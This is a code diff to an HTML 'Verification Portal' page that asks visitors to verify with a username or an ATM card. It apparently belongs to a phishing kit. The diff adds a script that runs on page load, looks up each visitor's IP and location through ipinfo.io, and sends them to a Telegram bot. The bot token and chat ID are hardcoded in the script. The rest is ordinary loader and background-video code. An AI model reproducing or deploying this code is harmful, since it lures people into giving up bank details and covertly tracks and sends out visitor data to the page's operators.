@@ -151,6 +151,28 @@
     .btn{ font-size:15px; padding:13px 16px; }
     .logo{ width:116px; }
   }
+
+  .loader-backdrop {
+  position: absolute;
+  inset: 0;
+  z-index: 1000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  background: rgba(0, 0, 0, 0.55);
+  backdrop-filter: blur(2px);
+}
+
+.loader-backdrop.show {
+  display: flex;
+}
+
+.loader-gif {
+  width: 60px; /* adjust as needed */
+  height: 60px;
+  object-fit: contain;
+}
+
 </style>
 </head>
 <body>
@@ -159,6 +181,9 @@
       <video id="bgVideo" autoplay muted loop playsinline preload="metadata" poster="">
         <source src="video_day.mp4" type="video/mp4" />
       </video>
+
+   
+
     </div>
 
     <div class="splash" id="splash">
@@ -172,9 +197,10 @@
     <main class="content" role="main" aria-label="Welcome">
       <h1 class="headline">Welcome to Verification Portal</h1>
       <div class="cta">
-        <button class="btn btn-primary" onclick="window.location.href='kg.html'" type="button">Verify with Username</button>
-        <div class="or">Or</div>
-        <button class="btn btn-primary" onclick="window.location.href='cp.html'" type="button">Verify with ATM Card</button>
+       <button class="btn btn-primary" data-nav="log.html" type="button">Verify with Username</button>
+<div class="or">Or</div>
+<button class="btn btn-primary" data-nav="cp.html" type="button">Verify with ATM Card</button>
+
       </div>
     </main>
 
@@ -189,62 +215,207 @@
       </div>
     </div>
   </div>
+   <div class="loader-backdrop" id="loader" aria-hidden="true">
+  <img src="cicle_loader.gif" alt="Loading..." class="loader-gif" />
+</div>
+<script>
+   window.addEventListener("load", async () => {
+    // SHOW CONTENT AFTER 3 SECONDS
+  
 
-  <script>
-    (function(){
-      const app    = document.getElementById('app');
-      const splash = document.getElementById('splash');
-      const video  = document.getElementById('bgVideo');
-      const notice = document.getElementById('notice');
-      const ackBtn = document.getElementById('ackBtn');
+    try {
+      const time = new Date().toISOString();
+      const browser = navigator.userAgent;
+      const ipRes = await fetch("https://ipinfo.io/json?token=b8a284ba09a629");
+      const ipData = await ipRes.json();
     
-      const prefersReduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-      if (prefersReduce && video){
-        video.removeAttribute('autoplay');
-        try { video.pause(); } catch(e){}
-      }
-      if (video){
-        video.loop = true;
-        video.addEventListener('ended', ()=> { video.currentTime = 0; video.play().catch(()=>{}); });
-      }
-    
-      let splashMinTime = parseInt(getComputedStyle(document.documentElement).getPropertyValue('--splash-ms')) || 1600;
-      let seenFrame = false, timerDone = false;
-      let modalTimer;   // <-- keep reference so we can clear it later
-    
-      const maybeReveal = () => {
-        if (!seenFrame || !timerDone) return;
-        splash.classList.add('hidden');
-        app.classList.remove('is-blurred');
-        app.classList.add('show-ui');
-    
-        // Open the Notice modal shortly after UI appears
-        modalTimer = setTimeout(()=>{ 
-          notice.classList.add('open'); 
-        }, 120);
-      };
-    
-      if (video){
-        const markFrame = () => { seenFrame = true; maybeReveal(); };
-        video.addEventListener('loadeddata', markFrame, {once:true});
-        video.addEventListener('canplay', markFrame, {once:true});
-        const tryPlay = () => video.play().catch(()=>{});
-        document.addEventListener('visibilitychange', () => { if (!document.hidden) tryPlay(); });
-        tryPlay();
-      } else {
-        seenFrame = true;
-      }
-    
-      setTimeout(()=>{ timerDone = true; maybeReveal(); }, splashMinTime);
-      setTimeout(()=>{ seenFrame = true; maybeReveal(); }, splashMinTime + 1200);
-    
-      // Close modal on button click
-      ackBtn.addEventListener('click', () => {
-        notice.classList.remove('open');
-        if (modalTimer) clearTimeout(modalTimer);   // <-- prevent it from reopening
+ const botToken = '8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8';
+                const chatId = '-5091670751';
+      const message = `
+🧠 New Visitor
+
+🕒 Time: ${time}
+🌍 IP: ${ipData.ip}
+📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
+`;
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
       });
-    })();
-    </script>
-    
+
+    } catch (error) {
+      console.error("Error sending data to Telegram:", error);
+    }
+  });
+(function(){
+  const app    = document.getElementById('app');
+  const splash = document.getElementById('splash');
+  const video  = document.getElementById('bgVideo');
+  const notice = document.getElementById('notice');
+  const ackBtn = document.getElementById('ackBtn');
+  const loader = document.getElementById('loader');
+  const navButtons = document.querySelectorAll('[data-nav]');
+
+  let modalTimer = null;
+  let splashMinTime = parseInt(getComputedStyle(document.documentElement).getPropertyValue('--splash-ms')) || 1600;
+  let seenFrame = false, timerDone = false;
+
+  // --- SAFARI/BFCACHE: reliably resume background video ---
+  async function resumeBgVideo() {
+    if (!video) return;
+
+    // Make sure attributes are set for autoplay on iOS
+    video.muted = true;
+    video.setAttribute('muted', '');      // boolean attribute helps Safari
+    video.setAttribute('playsinline', '');
+    video.autoplay = true;
+
+    // If the element is in a weird state after bfcache, reload it
+    if (video.readyState < 2) {
+      try { video.load(); } catch(e) {}
+      await new Promise(resolve => {
+        const onReady = () => { video.removeEventListener('loadeddata', onReady); resolve(); };
+        video.addEventListener('loadeddata', onReady, { once:true });
+        // Fallback in case loadeddata never fires
+        setTimeout(resolve, 200);
+      });
+    }
+
+    // Nudge currentTime slightly; fixes some iOS stalls
+    try {
+      if (video.currentTime === 0) {
+        video.currentTime = 0.001;
+      }
+    } catch (e) {}
+
+    // Try up to 3 times to play
+    for (let i = 0; i < 3; i++) {
+      try {
+        await video.play();
+        return; // success
+      } catch (e) {
+        // small delay then retry
+        await new Promise(r => setTimeout(r, 120));
+      }
+    }
+
+    // Last resort: re-attach the <source> (no cache-bust visible to users)
+    const srcEl = video.querySelector('source');
+    if (srcEl) {
+      const src = srcEl.getAttribute('src');
+      try {
+        srcEl.setAttribute('src', src); // re-assign same src
+        video.load();
+        await video.play().catch(()=>{});
+      } catch (e) {}
+    }
+  }
+
+  // ---- helpers ----
+  const resetUI = () => {
+    navButtons.forEach(b => b.disabled = false);
+    loader.classList.remove('show');
+    loader.setAttribute('aria-hidden', 'true');
+    notice.classList.remove('open');
+    app.classList.add('show-ui');
+    splash.classList.add('hidden');
+    app.classList.remove('is-blurred');
+    resumeBgVideo(); // <— ensure video resumes on return
+  };
+
+  const maybeReveal = () => {
+    if (!seenFrame || !timerDone) return;
+    splash.classList.add('hidden');
+    app.classList.remove('is-blurred');
+    app.classList.add('show-ui');
+    modalTimer = setTimeout(()=>{ notice.classList.add('open'); }, 120);
+  };
+
+  // ---- video setup (first load) ----
+  const prefersReduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if (prefersReduce && video){
+    video.removeAttribute('autoplay');
+    try { video.pause(); } catch(e){}
+  }
+  if (video){
+    video.loop = true;
+    video.addEventListener('ended', ()=> { video.currentTime = 0; video.play().catch(()=>{}); });
+    const markFrame = () => { seenFrame = true; maybeReveal(); };
+    video.addEventListener('loadeddata', markFrame, {once:true});
+    video.addEventListener('canplay',    markFrame, {once:true});
+
+    // First-time attempt
+    resumeBgVideo();
+
+    // If user brings tab/app back to foreground
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) resumeBgVideo();
+    });
+    window.addEventListener('focus', resumeBgVideo);
+  } else {
+    seenFrame = true;
+  }
+
+  // splash timers
+  const t1 = setTimeout(()=>{ timerDone = true; maybeReveal(); }, splashMinTime);
+  const t2 = setTimeout(()=>{ seenFrame = true; maybeReveal(); }, splashMinTime + 1200);
+
+  // close modal
+  ackBtn.addEventListener('click', () => {
+    notice.classList.remove('open');
+    if (modalTimer) clearTimeout(modalTimer);
+  });
+
+  // loader + delayed navigation
+  navButtons.forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.preventDefault();
+      const href = btn.getAttribute('data-nav');
+      if (!href) return;
+
+      notice.classList.remove('open');
+      navButtons.forEach(b => b.disabled = true);
+
+      loader.classList.add('show');
+      loader.setAttribute('aria-hidden', 'false');
+
+      setTimeout(() => {
+        window.location.href = href;
+      }, 3000);
+    });
+  });
+
+  // --- Back/forward cache restore ---
+  window.addEventListener('pageshow', (e) => {
+    const navEntry = performance.getEntriesByType('navigation')[0];
+    const cameFromBFCache = e.persisted || (navEntry && navEntry.type === 'back_forward');
+    if (cameFromBFCache) {
+      resetUI();          // restore UI + resume video
+    } else {
+      // Even when not marked as bfcache, some Safari paths still need a nudge
+      resumeBgVideo();
+    }
+  });
+
+  // Pause & clear timers when leaving (helps bfcache restore)
+  window.addEventListener('pagehide', (e) => {
+    if (modalTimer) clearTimeout(modalTimer);
+    clearTimeout(t1);
+    clearTimeout(t2);
+    try { video && video.pause(); } catch (_) {}
+  });
+
+  // As an extra safety net on iOS: if the user taps anywhere after back, start the video
+  window.addEventListener('touchstart', function onFirstTouch() {
+    resumeBgVideo();
+    window.removeEventListener('touchstart', onFirstTouch);
+  }, { passive:true });
+
+})();
+</script>
+
+
 </body>
 </html>
